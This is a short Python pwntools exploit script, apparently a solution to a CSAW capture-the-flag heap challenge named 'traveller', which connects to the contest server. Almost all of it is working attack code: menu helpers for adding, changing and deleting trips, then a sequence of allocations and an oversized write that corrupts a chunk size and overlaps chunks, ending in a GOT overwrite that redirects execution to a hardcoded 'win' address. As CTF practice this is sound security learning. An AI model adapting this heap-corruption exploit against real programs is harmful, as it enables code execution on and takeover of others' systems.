from pwn import *
from time import sleep as s

#also why is the stack given to us?
context.log_level = "DEBUG"


def wait(a):
	print p.read()

def add(a,string):
#1 80
#2 110
#3 128
#4 150
#5 200
	p.sendline('1')
	wait(">")
	p.sendline(str(a))
	s(.5)
	#wait(":")
	#s(.5)
	p.sendline(string)
	s(.5)
	wait("Trip ")
	s(.5)
	
def change(a,string):
	p.sendline('2')
	s(.5)
	p.sendline(str(a))
	s(.5)
	p.sendline(string)
	s(.5)
	wait(">")
	s(.5)

def delet(a):
	p.sendline('3')
	s(.5)
	p.sendline(str(a))
	s(.5)
	wait(">")	
	s(.5)

def getTrip(a): #used for checking value since they get rearranged on delet? And could be used to read libc// but not needed
	p.sendline('4')
	s(.5)
	wait(">")
	s(.5)
	p.sendline(str(a))
	s(.5)
	return wait("\n\n")

got = 0x602040
win = 0x4008b6

with remote('pwn.chal.csaw.io', 1003) as p:
#with process('./traveller') as p:
	wait(">")
	add(4,"ttt"*50)#0
	add(3,"A"*128) #1
	delet(0) #1 -> 0
	add(2,"TTT"*50)#1
	add(4,"B"*0xf0+p64(0x100))#2 B

	add(2,"C"*100)#C #3
	add(1, "BAR"*40)#Barrier #4
	delet(2)#4->2
	change(0,"a"*0x128)#overwrite #2 size
	add(1,"B1"*0x38) #4 B1
	add(1,"B2"*0x38)#5 B2
	delet(4)#5->4
	delet(3)#4->3
	add(5,"z"*144 + p64(got))#4 
	change(3,p64(win))
	change(0,"winner")
	

	
	p.interactive()
	
